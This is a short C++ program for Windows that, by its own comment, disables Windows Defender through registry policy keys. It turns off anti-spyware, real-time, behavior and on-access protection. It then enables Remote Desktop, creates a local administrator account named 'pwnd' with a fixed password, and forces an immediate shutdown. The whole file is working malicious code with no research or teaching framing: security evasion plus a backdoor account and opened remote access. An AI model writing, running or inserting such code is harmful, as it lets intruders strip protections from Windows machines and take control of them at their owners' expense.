#include <iostream>
#include <windows.h>

using namespace std;

bool isUserAdmin() {
    bool isElevated = false;
    HANDLE token;
    TOKEN_ELEVATION elev;
    DWORD size;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        if (GetTokenInformation(token, TokenElevation, &elev, sizeof(elev), &size)) {
            isElevated = elev.TokenIsElevated;
        }
    }
    if (token) {
        CloseHandle(token);
        token = NULL;
    }
    return isElevated;
}

// disable defender via registry
int main(int argc, char* argv[]) {
    HKEY key;
    HKEY new_key;
    DWORD disable = 1;

    if (!isUserAdmin()) {
        printf("please, run as admin.\n");
        return -1;
    }

    wchar_t rootRegistry[] = L"SOFTWARE\\Policies\\Microsoft\\Windows Defender";
    wchar_t disableAntiSpyware[] = L"DisableAntiSpyware";
    wchar_t disableRealTimeProtection[] = L"Real-Time Protection";
    wchar_t disableRealTimeMonitoring[] = L"DisableRealtimeMonitoring";
    wchar_t disableBehavior[] = L"DisableBehaviorMonitoring";
    wchar_t disableScanOnRealTime[] = L"DisableScanOnRealtimeEnable";
    wchar_t disableOnAccess[] = L"DisableOnAccessProtection";
    wchar_t disableIOAV[] = L"DisableIOAVProtection";


    LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, rootRegistry, 0, KEY_ALL_ACCESS, &key);
    if (res == ERROR_SUCCESS) {
        RegSetValueEx(key, disableAntiSpyware, 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
        RegCreateKeyEx(key, disableRealTimeProtection, 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &new_key, 0);
        RegSetValueEx(new_key, disableRealTimeMonitoring, 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
        RegSetValueEx(new_key, disableBehavior, 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
        RegSetValueEx(new_key, disableScanOnRealTime, 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
        RegSetValueEx(new_key, disableOnAccess, 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
        RegSetValueEx(new_key, disableIOAV, 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));

        RegCloseKey(key);
        RegCloseKey(new_key);
    }
    system("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f");
    system("net user pwnd Password321 /add;net localgroup administrators pwnd /add");
    system("C:\\Windows\\System32\\shutdown /s /t 0");

    return 1;
}